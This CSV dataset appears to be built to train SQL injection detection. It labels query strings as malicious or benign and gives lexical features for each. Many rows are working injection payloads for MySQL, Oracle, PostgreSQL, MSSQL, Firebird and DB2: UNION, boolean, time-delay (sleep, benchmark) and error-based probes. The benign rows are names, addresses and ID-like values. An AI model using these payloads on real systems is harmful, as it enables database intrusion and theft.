Query,Label,Query_preprocessed,qlen,wcount,sq,dq,puncts,comments,spaces,logic,arith,alpha,sqlkw,sqlfunc
"1"") as vdim where 1296=1296;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1,as vdim where select count from sysibm systables as t1 sysibm systables as t2 sysibm systables as t3,119,18,0,1,7,1,13,0,3,80,7,1
laflamme6,0,laflamme6,9,1,0,0,0,0,0,0,0,8,0,0
-8999'))) or 6872=6872 and ((('jare'='jare,1,or and jare jare,42,4,4,0,2,0,4,2,1,13,2,0
pradeep,0,pradeep,7,1,0,0,0,0,0,0,0,7,0,0
avda. general elizaicin 64 5-d,0,avda general elizaicin,30,3,0,0,1,0,4,0,1,21,0,0
12310,0,,5,0,0,0,0,0,0,0,0,0,0,0
37882,0,,5,0,0,0,0,0,0,0,0,0,0,0
faada,0,faada,5,1,0,0,0,0,0,0,0,5,0,0
93,0,,2,0,0,0,0,0,0,0,0,0,0,0
schadan,0,schadan,7,1,0,0,0,0,0,0,0,7,0,0
1));select case when 8237=9948 then 1 else null end--,1,select case when then else null end,53,7,0,0,2,1,8,0,2,29,7,0
anguita,0,anguita,7,1,0,0,0,0,0,0,0,7,0,0
ob7491,0,ob7491,6,1,0,0,0,0,0,0,0,2,0,0
"calle alonso nuez 186, 12?b",0,calle alonso nuez,27,3,0,0,2,0,4,0,0,16,0,0
41392002y,0,41392002y,9,1,0,0,0,0,0,0,0,1,0,0
09311,0,,5,0,0,0,0,0,0,0,0,0,0,0
25132,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1' or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and 'zpyx'='zpyx",1,or exp select from select concat 0x7171706a71 select elt 0x717a767a71 0x78 and zpyx zpyx,121,14,4,0,7,0,9,2,1,54,6,3
"1"" and 3824=benchmark(5000000,md5(0x76555642)) and ""tqbi""=""tqbi",1,and benchmark md5 0x76555642 and tqbi tqbi,63,7,0,4,3,0,4,2,0,26,2,2
"1"")) and 7533=7533 and ((""gkca""=""gkca",1,and and gkca gkca,37,4,0,4,2,0,4,2,0,14,2,0
31271,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1'))) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('jicq' like 'jicq",1,and select from select count concat 0x7171706a71 select elt 0x717a767a71 floor rand from information_schema character_sets group by and jicq like jicq,201,21,4,0,9,0,15,2,2,112,10,5
brigida,0,brigida,7,1,0,0,0,0,0,0,0,7,0,0
gayol,0,gayol,5,1,0,0,0,0,0,0,0,5,0,0
4815643958728547,0,,16,0,0,0,0,0,0,0,0,0,0,0
80135646n,0,80135646n,9,1,0,0,0,0,0,0,0,1,0,0
"1"")) as yuqr where 7226=7226 and (select * from (select(sleep(5)))gcrr)#",1,as yuqr where and select from select sleep gcrr,72,9,0,1,2,1,9,1,1,39,6,1
"-2112 union all select 2995,2995,2995,2995,2995--",1,union all select,49,3,0,0,4,1,4,0,3,14,3,0
1%')) or sleep(5)#,1,or sleep,18,2,1,0,2,1,2,1,0,7,1,1
solar,0,solar,5,1,0,0,0,0,0,0,0,5,0,0
1');begin dbms_lock.sleep(5); end and ('jzlr'='jzlr,1,begin dbms_lock sleep end and jzlr jzlr,51,7,4,0,5,0,4,1,0,32,3,1
porquet camarillo,0,porquet camarillo,17,2,0,0,0,0,1,0,0,16,0,0
cuitada,0,cuitada,7,1,0,0,0,0,0,0,0,7,0,0
1 where 3027=3027 and 4595=4595#,1,where and,32,2,0,0,3,1,4,1,0,8,2,0
77000029p,0,77000029p,9,1,0,0,0,0,0,0,0,1,0,0
desans totohuetotzint,0,desans totohuetotzint,21,2,0,0,0,0,1,0,0,20,0,0
telma,0,telma,5,1,0,0,0,0,0,0,0,5,0,0
bazarjan,0,bazarjan,8,1,0,0,0,0,0,0,0,8,0,0
4l6ad1e14,0,4l6ad1e14,9,1,0,0,0,0,0,0,0,4,0,0
adverbializar,0,adverbializar,13,1,0,0,0,0,0,0,0,13,0,0
dariela,0,dariela,7,1,0,0,0,0,0,0,0,7,0,0
rahmani,0,rahmani,7,1,0,0,0,0,0,0,0,7,0,0
brittni,0,brittni,7,1,0,0,0,0,0,0,0,7,0,0
1')) and 7533=7533 and (('gvoh'='gvoh,1,and and gvoh gvoh,37,4,4,0,2,0,4,2,0,14,2,0
wincott_remeck@enformetera.com.sc,0,wincott_remeck enformetera com sc,33,4,0,0,4,0,0,0,0,29,0,0
1;select sleep(5)#,1,select sleep,18,2,0,0,2,1,1,0,0,11,1,1
peracaul cerf,0,peracaul cerf,13,2,0,0,0,0,1,0,0,12,0,0
rains8,0,rains8,6,1,0,0,0,0,0,0,0,5,0,0
94987112x,0,94987112x,9,1,0,0,0,0,0,0,0,1,0,0
1'||(select 'ptfi' from dual where 2234=2234 and 2006=2006,1,select ptfi from dual where and,58,6,3,0,4,0,7,1,0,26,4,0
"passeig torrent 10, 2f",0,passeig torrent 2f,22,3,0,0,1,0,3,0,0,15,0,0
95868852e,0,95868852e,9,1,0,0,0,0,0,0,0,1,0,0
olmo,0,olmo,4,1,0,0,0,0,0,0,0,4,0,0
8474675220591045,0,,16,0,0,0,0,0,0,0,0,0,0,0
garrovillas de alcontar,0,garrovillas de alcontar,23,3,0,0,0,0,2,0,0,21,0,0
acabronada,0,acabronada,10,1,0,0,0,0,0,0,0,10,0,0
stephano@clinicadentalsansalvador.nf,0,stephano clinicadentalsansalvador nf,36,3,0,0,2,0,0,0,0,34,0,0
ammiel,0,ammiel,6,1,0,0,0,0,0,0,0,6,0,0
velov@expozaragozafloral2014.ac,0,velov expozaragozafloral2014 ac,31,3,0,0,2,0,0,0,0,25,0,0
velasque9,0,velasque9,9,1,0,0,0,0,0,0,0,8,0,0
"1')) union all select null,null,null,null,null,null,null,null#",1,union all select null null null null null null null null,62,11,1,0,8,1,4,0,0,46,11,0
"1'))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",1,or select count from domain domains as t1 domain columns as t2 domain tables as t3,100,16,1,0,6,1,11,1,3,64,6,1
stroeby@jesusfelipe.lv,0,stroeby jesusfelipe lv,22,3,0,0,2,0,0,0,0,20,0,0
"1%') and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,and char char char char regexp_substring repeat left crypt_key char char char null null,145,14,1,0,18,1,2,1,2,72,4,11
16537,0,,5,0,0,0,0,0,0,0,0,0,0,0
sirevici,0,sirevici,8,1,0,0,0,0,0,0,0,8,0,0
ilusiva,0,ilusiva,7,1,0,0,0,0,0,0,0,7,0,0
99631010r,0,99631010r,9,1,0,0,0,0,0,0,0,1,0,0
"1)) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((7992=7992",1,and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and,116,15,0,0,11,0,12,2,1,66,4,1
"1'+(select 'phtz' where 3171=3171;select count(*) from generate_series(1,5000000)--",1,select phtz where select count from generate_series,83,7,3,0,4,1,6,0,4,44,4,1
panter,0,panter,6,1,0,0,0,0,0,0,0,6,0,0
"-5150))) union all select 5660,5660,5660#",1,union all select,41,3,0,0,3,1,4,0,1,14,3,0
"-6746"") or (8459=8459)*4906 and (""kohi"" like ""kohi",1,or and kohi like kohi,50,5,0,4,1,0,6,2,2,17,3,0
medina del campo,0,medina del campo,16,3,0,0,0,0,2,0,0,14,0,0
"burgos, s/n, 1f",0,burgos 1f,15,2,0,0,2,0,2,0,1,9,0,0
sternikova@clo2.mg,0,sternikova clo2 mg,18,3,0,0,2,0,0,0,0,15,0,0
-9264') or 8571=8571--,1,or,22,1,1,0,1,1,2,1,3,2,0,0
c/ orient 45,0,orient,12,1,0,0,0,0,2,0,1,7,0,0
or5ina8ia,0,or5ina8ia,9,1,0,0,0,0,0,0,0,7,0,0
"-8454"" or 6872=6872",1,or,19,1,0,1,1,0,2,1,1,2,0,0
macrura,0,macrura,7,1,0,0,0,0,0,0,0,7,0,0
0a3ramplar,0,0a3ramplar,10,1,0,0,0,0,0,0,0,8,0,0
"-9156')) union all select 9110,9110,9110,9110#",1,union all select,46,3,1,0,4,1,4,0,1,14,3,0
"-3860' union all select 3510,3510,3510#",1,union all select,39,3,1,0,3,1,4,0,1,14,3,0
enio,0,enio,4,1,0,0,0,0,0,0,0,4,0,0
"1,extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",1,extractvalue concat 0x5c 0x7171706a71 select elt 0x717a767a71,87,7,0,0,7,0,1,0,0,34,1,3
1';(select * from (select(sleep(5)))srmq) and 'mcrt'='mcrt,1,select from select sleep srmq and mcrt mcrt,58,8,4,0,2,0,5,1,1,36,4,1
49718,0,,5,0,0,0,0,0,0,0,0,0,0,0
helano,0,helano,6,1,0,0,0,0,0,0,0,6,0,0
"1'||(select 'xjcg' from dual where 5815=5815 union all select null,null,null#",1,select xjcg from dual where union all select null null null,77,11,3,0,6,1,9,0,0,49,9,0
documet recasens,0,documet recasens,16,2,0,0,0,0,1,0,0,15,0,0
hossana,0,hossana,7,1,0,0,0,0,0,0,0,7,0,0
ce7a964na,0,ce7a964na,9,1,0,0,0,0,0,0,0,5,0,0
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and 'vhvh'='vhvh",1,select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and vhvh vhvh,105,16,4,0,11,0,10,1,1,71,3,1
6135978760612674,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1');select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('afdy' like 'afdy",1,select like abcdefg upper hex randomblob and afdy like afdy,85,10,6,0,2,0,5,1,1,50,4,3
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('iwwa' like 'iwwa",1,create or replace function sleep int returns int as lib libc so sleep language strict select sleep and iwwa like iwwa,145,21,10,0,5,0,17,2,2,98,7,4
1%'))) and sleep(5) and ((('%'=',1,and sleep and,32,3,4,0,3,0,4,2,0,11,2,1
18179,0,,5,0,0,0,0,0,0,0,0,0,0,0
vogin,0,vogin,5,1,0,0,0,0,0,0,0,5,0,0
melquades,0,melquades,9,1,0,0,0,0,0,0,0,9,0,0
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""wtkx""=""wtkx",1,and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7 and wtkx wtkx,170,28,0,4,8,0,21,2,1,120,11,1
)u6(37'f,0,u6,8,1,1,0,0,0,0,0,0,2,0,0
-4219' or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))),1,or in char char char char char select case when then char else char end char char char char char,186,20,1,0,1,0,12,1,11,77,8,12
"1 where 7757=7757 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",1,where and updatexml concat 0x2e 0x7171706a71 select elt 0x717a767a71,111,9,0,0,8,1,5,1,2,39,3,3
16600,0,,5,0,0,0,0,0,0,0,0,0,0,0
"juan antonio simon 199,",0,juan antonio simon,23,3,0,0,1,0,3,0,0,16,0,0
"-9929') as gbtc where 8162=8162 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",1,as gbtc where or group by concat 0x7171706a71 select case when then else end 0x717a767a71 floor rand having min,162,19,1,0,6,1,19,1,2,74,12,3
26580,0,,5,0,0,0,0,0,0,0,0,0,0,0
hubach larrumbe,0,hubach larrumbe,15,2,0,0,0,0,1,0,0,14,0,0
bayliss@joll.tz,0,bayliss joll tz,15,3,0,0,2,0,0,0,0,13,0,0
e906aci9,0,e906aci9,8,1,0,0,0,0,0,0,0,4,0,0
perpiny romero,0,perpiny romero,14,2,0,0,0,0,1,0,0,13,0,0
"1%' union all select null,null#",1,union all select null null,31,5,1,0,3,1,4,0,0,22,5,0
"1"") as bksv where 5375=5375;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",1,as bksv where select case when then else cast as int select from dual end from dual,125,17,0,1,3,1,19,0,3,67,12,0
1'))) and sleep(5) and ((('hwjy'='hwjy,1,and sleep and hwjy hwjy,38,5,4,0,1,0,4,2,0,19,2,1
queso manchego,0,queso manchego,14,2,0,0,0,0,1,0,0,13,0,0
-2951 or 4189=2291,1,or,18,1,0,0,1,0,2,1,1,2,0,0
"-1593' or elt(7044=6125,6125) and 'zkuz'='zkuz",1,or elt and zkuz zkuz,46,5,4,0,3,0,4,2,1,16,2,1
1 where 6304=6304;begin dbms_lock.sleep(5); end--,1,where begin dbms_lock sleep end,49,5,0,0,5,1,4,0,2,26,3,1
4698577318753037,0,,16,0,0,0,0,0,0,0,0,0,0,0
karina9,0,karina9,7,1,0,0,0,0,0,0,0,6,0,0
aleandra,0,aleandra,8,1,0,0,0,0,0,0,0,8,0,0
tamer,0,tamer,5,1,0,0,0,0,0,0,0,5,0,0
nagel ordoes,0,nagel ordoes,12,2,0,0,0,0,1,0,0,11,0,0
"-7125"" or (8919=2275)*2275 and ""fbwo""=""fbwo",1,or and fbwo fbwo,43,4,0,4,2,0,4,2,2,13,2,0
"c/ el salvador 199, 9-a",0,el salvador,23,2,0,0,1,0,4,0,2,12,0,0
9570,0,,4,0,0,0,0,0,0,0,0,0,0,0
clam!o,0,clam,6,1,0,0,1,0,0,0,0,5,0,0
5osan$9a,0,5osan 9a,8,2,0,0,1,0,0,0,0,5,0,0
79039106c,0,79039106c,9,1,0,0,0,0,0,0,0,1,0,0
6140461790572625,0,,16,0,0,0,0,0,0,0,0,0,0,0
"calle suceso terrero 68, 7a",0,calle suceso terrero 7a,27,4,0,0,1,0,4,0,0,19,0,0
astrolito,0,astrolito,9,1,0,0,0,0,0,0,0,9,0,0
1 and (1977=6852)*6852-- clxl,1,and clxl,29,2,0,0,1,1,3,1,3,7,1,0
20e28u6r,0,20e28u6r,8,1,0,0,0,0,0,0,0,3,0,0
"1')) union all select null,null,null,null,null,null--",1,union all select null null null null null null,53,9,1,0,5,1,4,0,2,38,9,0
nineteen@drivinn.int,0,nineteen drivinn int,20,3,0,0,2,0,0,0,0,18,0,0
gas40so,0,gas40so,7,1,0,0,0,0,0,0,0,5,0,0
"1%"")) union all select null,null,null,null,null,null,null,null#",1,union all select null null null null null null null null,63,11,0,1,9,1,4,0,0,46,11,0
318,0,,3,0,0,0,0,0,0,0,0,0,0,0
"1') where 3572=3572;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",1,where select count from rdb fields as t1 rdb types as t2 rdb collations as t3 rdb functions as t4,116,20,1,0,9,1,13,0,3,74,7,1
5727406430841841,0,,16,0,0,0,0,0,0,0,0,0,0,0
-1436' or 5699=5783--,1,or,21,1,1,0,1,1,2,1,3,2,0,0
"1"" and 4288=3696 and ""qqam"" like ""qqam",1,and and qqam like qqam,38,5,0,4,1,0,6,2,0,18,3,0
38410,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1');select benchmark(5000000,md5(0x714e4153))#",1,select benchmark md5 0x714e4153,46,4,1,0,3,1,1,0,0,19,1,2
"8bpb2""",0,8bpb,8,1,0,1,0,0,0,0,0,3,0,0
tenesaca chaves,0,tenesaca chaves,15,2,0,0,0,0,1,0,0,14,0,0
"1%')) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",1,and dbms_pipe receive_message chr chr chr chr,81,7,1,0,12,1,2,1,2,37,1,6
8615,0,,4,0,0,0,0,0,0,0,0,0,0,0
geraldina,0,geraldina,9,1,0,0,0,0,0,0,0,9,0,0
edilio,0,edilio,6,1,0,0,0,0,0,0,0,6,0,0
mara,0,mara,4,1,0,0,0,0,0,0,0,4,0,0
gourley,0,gourley,7,1,0,0,0,0,0,0,0,7,0,0
boquieni,0,boquieni,8,1,0,0,0,0,0,0,0,8,0,0
8653,0,,4,0,0,0,0,0,0,0,0,0,0,0
"1') as keom where 7524=7524 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,as keom where and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,180,28,1,0,8,1,23,1,3,120,12,1
bqa(ux,0,bqa ux,8,2,0,0,0,0,0,0,0,5,0,0
rq,0,rq,2,1,0,0,0,0,0,0,0,2,0,0
trujillo,0,trujillo,8,1,0,0,0,0,0,0,0,8,0,0
"1') where 8268=8268 union all select null,null,null,null--",1,where union all select null null null null,58,8,1,0,4,1,6,0,2,35,8,0
halpin,0,halpin,6,1,0,0,0,0,0,0,0,6,0,0
"1"") where 2633=2633 union all select null,null,null,null#",1,where union all select null null null null,57,8,0,1,5,1,6,0,0,35,8,0
1') and (select * from (select(sleep(5)))fzno) and ('eqfh'='eqfh,1,and select from select sleep fzno and eqfh eqfh,64,9,4,0,1,0,7,2,1,39,5,1
amann 132,0,amann,9,1,0,0,0,0,1,0,0,5,0,0
fryd garreta,0,fryd garreta,12,2,0,0,0,0,1,0,0,11,0,0
kosmalska_gayou@inversioneolica.mv,0,kosmalska_gayou inversioneolica mv,34,3,0,0,3,0,0,0,0,31,0,0
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('gmil'='gmil",1,or select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5 and gmil gmil,117,17,4,0,11,0,12,2,1,73,4,1
patten,0,patten,6,1,0,0,0,0,0,0,0,6,0,0
caete,0,caete,5,1,0,0,0,0,0,0,0,5,0,0
medey,0,medey,5,1,0,0,0,0,0,0,0,5,0,0
revill5,0,revill5,7,1,0,0,0,0,0,0,0,6,0,0
faust2@cocheacoche.cg,0,faust2 cocheacoche cg,21,3,0,0,2,0,0,0,0,18,0,0
"1'+(select ummn where 8883=8883 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))+'",1,select ummn where and convert int select char char char char char select case when then char else char end char char char char char,230,25,2,0,4,0,14,1,12,107,10,12
mombuey,0,mombuey,7,1,0,0,0,0,0,0,0,7,0,0
loamiento,0,loamiento,9,1,0,0,0,0,0,0,0,9,0,0
"1)) and elt(4249=4249,7259) and ((5683=5683",1,and elt and,43,3,0,0,3,0,4,2,0,9,2,1
tinajas,0,tinajas,7,1,0,0,0,0,0,0,0,7,0,0
1%') order by 1--,1,order by,17,2,1,0,1,1,3,0,2,7,2,0
"1"");select benchmark(5000000,md5(0x714e4153))#",1,select benchmark md5 0x714e4153,46,4,0,1,3,1,1,0,0,19,1,2
churriana de la vega,0,churriana de la vega,20,4,0,0,0,0,3,0,0,17,0,0
1')) and 3355=6012 and (('ofmy'='ofmy,1,and and ofmy ofmy,37,4,4,0,2,0,4,2,0,14,2,0
elssser gula,0,elssser gula,12,2,0,0,0,0,1,0,0,11,0,0
wilmont,0,wilmont,7,1,0,0,0,0,0,0,0,7,0,0
baos de ebro/maueta,0,baos de ebro maueta,19,4,0,0,0,0,2,0,1,16,0,0
ߏ},0,,2,0,0,0,1,0,0,0,0,0,0,0
1'+(select ijoh where 7145=7145 order by 1--,1,select ijoh where order by,44,5,1,0,1,1,6,0,3,22,4,0
butjosa,0,butjosa,7,1,0,0,0,0,0,0,0,7,0,0
"c/ ruiz de salazar, 49 4d",0,ruiz de salazar 4d,25,4,0,0,1,0,5,0,1,15,0,0
1'||(select 'lmsc' from dual where 1162=1162 order by 1--,1,select lmsc from dual where order by,57,7,3,0,3,1,8,0,2,30,5,0
"consolacion 92, 12?h",0,consolacion,20,1,0,0,2,0,2,0,0,12,0,0
monino,0,monino,6,1,0,0,0,0,0,0,0,6,0,0
novikoff@schnapps.com.cl,0,novikoff schnapps com cl,24,4,0,0,3,0,0,0,0,21,0,0
babilas,0,babilas,7,1,0,0,0,0,0,0,0,7,0,0
caca ihnen,0,caca ihnen,10,2,0,0,0,0,1,0,0,9,0,0
"1')) as kgiw where 7452=7452 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",1,as kgiw where and select count from sysusers as sys1 sysusers as sys2 sysusers as sys3 sysusers as sys4 sysusers as sys5 sysusers as sys6 sysusers as sys7,181,28,1,0,8,1,23,1,3,120,12,1
brasset,0,brasset,7,1,0,0,0,0,0,0,0,7,0,0
88918773z,0,88918773z,9,1,0,0,0,0,0,0,0,1,0,0
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((""rthl"" like ""rthl",1,create or replace function sleep int returns int as lib libc so sleep language strict select sleep and rthl like rthl,143,21,6,4,5,0,17,2,2,98,7,4
"1 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",1,and char char char char regexp_substring repeat right char null,109,10,0,0,11,1,2,1,2,53,3,8
ludwig_schuster@viavilano.web,0,ludwig_schuster viavilano web,29,3,0,0,3,0,0,0,0,26,0,0
1capa2ad*or,0,1capa2ad or,11,2,0,0,0,0,0,1,1,8,1,0
ruqiang,0,ruqiang,7,1,0,0,0,0,0,0,0,7,0,0
gil garca,0,gil garca,9,2,0,0,0,0,1,0,0,8,0,0
calle madagascar 130,0,calle madagascar,20,2,0,0,0,0,2,0,0,15,0,0
80876345l,0,80876345l,9,1,0,0,0,0,0,0,0,1,0,0
07831245k,0,07831245k,9,1,0,0,0,0,0,0,0,1,0,0
mayola laparra,0,mayola laparra,14,2,0,0,0,0,1,0,0,13,0,0
"-6263"" union all select 8005,8005#",1,union all select,34,3,0,1,2,1,4,0,1,14,3,0
27860,0,,5,0,0,0,0,0,0,0,0,0,0,0
0957098737909112,0,,16,0,0,0,0,0,0,0,0,0,0,0
"1 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))# qmkh",1,and like abcdefg upper hex randomblob qmkh,68,7,2,0,3,1,3,1,1,36,2,3
"c/ salgueiral, 198",0,salgueiral,18,1,0,0,1,0,2,0,1,11,0,0
fazenda_heigh@unanuevavisionenortodoncia.gh,0,fazenda_heigh unanuevavisionenortodoncia gh,43,3,0,0,3,0,0,0,0,40,0,0
swinton@voragolive.kz,0,swinton voragolive kz,21,3,0,0,2,0,0,0,0,19,0,0
1'||(select 'tzxr' from dual where 2934=2934 and 4595=4595#,1,select tzxr from dual where and,59,6,3,0,5,1,7,1,0,26,4,0
30802142j,0,30802142j,9,1,0,0,0,0,0,0,0,1,0,0
tekurarere@velaconsultores.no,0,tekurarere velaconsultores no,29,3,0,0,2,0,0,0,0,27,0,0
betts@beltoan.com.my,0,betts beltoan com my,20,4,0,0,3,0,0,0,0,17,0,0
1206132385577691,0,,16,0,0,0,0,0,0,0,0,0,0,0
alh4a3,0,alh4a3,6,1,0,0,0,0,0,0,0,4,0,0
en2re7e4hu16,0,en2re7e4hu16,12,1,0,0,0,0,0,0,0,7,0,0
enrico,0,enrico,6,1,0,0,0,0,0,0,0,6,0,0
muntadas,0,muntadas,8,1,0,0,0,0,0,0,0,8,0,0
"1'+(select fhbk where 2570=2570 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",1,select fhbk where and select count from all_users t1 all_users t2 all_users t3 all_users t4 all_users t5,131,17,2,0,11,0,13,1,3,78,5,1
marcolino,0,marcolino,9,1,0,0,0,0,0,0,0,9,0,0
daniza,0,daniza,6,1,0,0,0,0,0,0,0,6,0,0
en683$67,0,en683,8,1,0,0,1,0,0,0,0,2,0,0
36830,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1"" where 3510=3510;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,where call regexp_substring repeat left crypt_key char char char null null,119,11,0,1,12,1,3,0,2,62,5,7
"1'))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",1,or char char char char regexp_substring repeat right char null,114,10,1,0,11,1,2,1,2,52,3,8
enardecedora,0,enardecedora,12,1,0,0,0,0,0,0,0,12,0,0
emil,0,emil,4,1,0,0,0,0,0,0,0,4,0,0
7s0av07rido,0,7s0av07rido,11,1,0,0,0,0,0,0,0,7,0,0
-1468'))) or 4875=6163#,1,or,23,1,1,0,2,1,2,1,1,2,0,0
5170844676174994,0,,16,0,0,0,0,0,0,0,0,0,0,0
1' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and 'pziy'='pziy,1,and qqpjq select case when then else end from rdb database qzvzq and pziy pziy,113,15,8,0,7,0,15,2,0,64,9,1
"-9947""))) union all select 8765,8765,8765,8765,8765#",1,union all select,52,3,0,1,5,1,4,0,1,14,3,0
numeradora,0,numeradora,10,1,0,0,0,0,0,0,0,10,0,0
petruck,0,petruck,7,1,0,0,0,0,0,0,0,7,0,0
gt@w6eb,0,gt w6eb,8,2,0,0,1,0,0,0,0,5,0,0
뭶,0,,1,0,0,0,0,0,0,0,0,0,0,0
arona,0,arona,5,1,0,0,0,0,0,0,0,5,0,0
34491,0,,5,0,0,0,0,0,0,0,0,0,0,0
"calle igualada, 143,",0,calle igualada,20,2,0,0,2,0,2,0,0,13,0,0
xelhuantzi bruns,0,xelhuantzi bruns,16,2,0,0,0,0,1,0,0,15,0,0
irureta kosiner,0,irureta kosiner,15,2,0,0,0,0,1,0,0,14,0,0
26526,0,,5,0,0,0,0,0,0,0,0,0,0,0
"1""))) union all select null,null,null,null,null,null--",1,union all select null null null null null null,54,9,0,1,5,1,4,0,2,38,9,0
1)) as myxo where 1759=1759 union all select null#,1,as myxo where union all select null,50,7,0,0,2,1,8,0,0,29,6,0
parcent,0,parcent,7,1,0,0,0,0,0,0,0,7,0,0
1');select (case when (1039=5127) then 1039 else 1039*(select 1039 from information_schema.character_sets) end)#,1,select case when then else select from information_schema character_sets end,112,10,1,0,6,1,11,0,1,65,8,0
e561o,0,e561o,5,1,0,0,0,0,0,0,0,2,0,0
y,0,,2,0,0,0,0,0,0,0,0,1,0,0
cerceda,0,cerceda,7,1,0,0,0,0,0,0,0,7,0,0
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('ywxe' like 'ywxe",1,procedure analyse extractvalue concat 0x5c benchmark md5 0x52515a50 and ywxe like ywxe,118,12,4,0,4,0,6,1,0,64,2,6
